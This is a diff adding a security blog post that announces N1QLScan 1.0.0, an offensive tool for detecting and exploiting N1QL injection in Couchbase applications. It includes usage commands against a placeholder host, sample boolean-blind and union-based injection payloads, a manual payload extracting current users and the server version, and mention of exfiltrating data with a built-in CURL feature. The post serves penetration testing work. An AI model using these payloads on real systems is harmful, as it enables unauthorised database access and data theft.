@@ -1,0 +1,182 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>N1QLScan // FelSec - Blog</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="FelSec" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://felsec.com/css/main.min.f6361b42d404a23cafcf1b9a8cab08905c6731c6a4a64ef829e96f416baf2537.css" />
+    <link rel="stylesheet" href="/css/code.css" />
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="N1QLScan">
+  <meta name="twitter:description" content="Release Version 1.0.0">
+
+    <meta property="og:url" content="https://felsec.com/posts/n1qlscan/">
+  <meta property="og:site_name" content="FelSec - Blog">
+  <meta property="og:title" content="N1QLScan">
+  <meta property="og:description" content="Release Version 1.0.0">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-03-02T20:02:00+00:00">
+    <meta property="article:modified_time" content="2026-03-02T20:02:00+00:00">
+    <meta property="article:tag" content="Tools">
+    <meta property="article:tag" content="Couchbase">
+    <meta property="article:tag" content="N1QL">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://felsec.com/"><img class="app-header-avatar" src="/avatar.png" alt="FelSec" /></a>
+      <h1>FelSec - Blog</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/posts/">Posts</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Penetration Tester &amp; Security Researcher</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/felsec" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://bsky.app/profile/felsec.bsky.social" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">N1QLScan</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 2, 2026
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://felsec.com/tags/tools/">Tools</a>
+              <a class="tag" href="https://felsec.com/tags/couchbase/">Couchbase</a>
+              <a class="tag" href="https://felsec.com/tags/n1ql/">N1QL</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="n1qlscan---release-version-100">N1QLScan - Release Version 1.0.0</h1>
+<p>N1QLScan version 1.0.0 has finally been released!!</p>
+<h2 id="what-is-it">What is it?</h2>
+<p>N1QLScan is a tool for automating the detection and exploitation of N1QL injection vulnerabilities. It has undergone many iterations and rewrites, but it is finally been released and can be found at the link below:</p>
+<p><a href="https://github.com/FelSec/n1qlscan">N1QLScan</a></p>
+<h2 id="what-does-it-do">What does it do?</h2>
+<p>It aims to simplify the detection and exploitation of N1QL injection vulnerabilities, but still allows advanced exploitation through specifying custom payloads.</p>
+<h2 id="usage">Usage</h2>
+<h3 id="installation">Installation</h3>
+<p>It can be installed directly via the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>go install github.com/felsec/n1qlscan@latest
+</span></span></code></pre></div><p>Alternatively, the pre-compiled binaries can be downloaded from the GitHub repos&rsquo; <a href="https://github.com/FelSec/n1qlscan/releases">Releases page</a>.</p>
+<h3 id="modes">Modes</h3>
+<p>N1QLScan has 3 modes:</p>
+<ol>
+<li>Scan</li>
+</ol>
+<p>This mode takes a URL or request file and scans the available parameters for N1QL injection points. If a vulnerable endpoint is detected the application determines the injection methods that can be used and generates a test payload for easy confirmation. A <code>vulnerable.data</code> file is also produced ready for use in the next mode.</p>
+<ol start="2">
+<li>Exploit</li>
+</ol>
+<p>This mode uses the exploitation methods in the <code>vulnerable.data</code> file to extract the requested data from the Couchbase instance.</p>
+<p>It also allows for the exfiltration of data to remote hosts using the built-in <code>CURL</code> functionality.</p>
+<ol start="3">
+<li>Manual</li>
+</ol>
+<p>This mode, as the name suggests, allow you to perform custom exploitation attempts against applications or specify advanced payloads.</p>
+<h3 id="running-a-scan">Running a scan</h3>
+<p>Running a scan against a target application can either be done by specifying the URL:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan scan -u https://vulnerable.app/blog/post?id<span style="color:#f92672">=</span><span style="color:#ae81ff">123456</span>
+</span></span></code></pre></div><p>Or, by providing a request file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan scan -r ./vulnerable-request
+</span></span></code></pre></div><p>Running <code>n1qlscan scan -h</code> gives you a comprehensive list of all of the options supported by the <code>scan</code> command.</p>
+<p>N1QLScan will then go through all of the injection points and attempt to identify any vulnerable parameters, returning the following on a successful scan:</p>
+<pre tabindex="0"><code>+============================================================+
+
+Query parameter id is vulnerable to Boolean-based Blind N1QL injection
+Location: Query parameter
+Parameter: id
+Detection Method: p1&#39;
+Exploit Type: Boolean-based Blind
+Example Payload: p1&#39;and&#39;S2LYgiU1&#39;=&#39;S2LYgiU1
+Payload Template: p1&#39;and&lt;payload&gt;=&lt;check&gt;
+
++============================================================+
+...
++============================================================+
+
+Query parameter id is vulnerable to Union-based N1QL injection
+Location: Query parameter
+Parameter: id
+Detection Method: p1&#39;)--
+Exploit Type: Union-based
+Example Payload: p1&#39;union select&#39;N1QLSCAN&#39;as nickel28)--
+Payload Template: p1&#39;union &lt;payload&gt;)--
+
++============================================================+
+...
+</code></pre><p>At this point we are ready to move onto the next phase.</p>
+<h3 id="exploiting-a-target">Exploiting a target</h3>
+<p>After successfully scanning the target application and identifying a vulnerable parameter, the next step is to run malicious queries to extract the data from the Couchbase instance. This can be done as follows:</p>
+<p><strong>URL:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan exploit -u https://vulnerable.app/blog/post?id<span style="color:#f92672">=</span><span style="color:#ae81ff">123456</span> --get-current-user
+</span></span></code></pre></div><p><strong>Request File:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan exploit -r ./vulnerable-request --get-current-user
+</span></span></code></pre></div><p>Running <code>n1qlscan exploit -h</code> gives you a comprehensive list of all of the options supported by the <code>exploit</code> command.</p>
+<h3 id="running-a-manual-attack">Running a manual attack</h3>
+<p>When running a manual attack you need to specify the following parts:</p>
+<ul>
+<li>The target via a URL or request file;</li>
+<li>The parameter to inject the payload into;</li>
+<li>The payload to be executed.</li>
+</ul>
+<pre tabindex="0"><code>n1qlscan manual {--url URL | --request FILE} --payload PAYLOAD --parameter PARAMETER
+</code></pre><p>For example:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>n1qlscan manual --url <span style="color:#e6db74">&#39;http://vulnerable.app/blog/post?id=p1&amp;debug=y&#39;</span> --parameter id --payload <span style="color:#e6db74">&#34;&#39; UNION SELECT raw {\&#34;title\&#34;:\&#34;N1QLSCAN\&#34;,\&#34;content\&#34;:\&#34;injected-\&#34;||CURRENT_USERS()[0],\&#34;id\&#34;:DS_VERSION()} )--&#34;</span>
+</span></span></code></pre></div><p>Running <code>n1qlscan manual -h</code> gives you a comprehensive list of all of the options supported by the <code>manual</code> command.</p>
+<h2 id="future-developments">Future Developments</h2>
+<p>As this is first there are lots of areas for improvement or new features that can be added, such as support for obfuscation methods, so keep any eye out for new releases.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
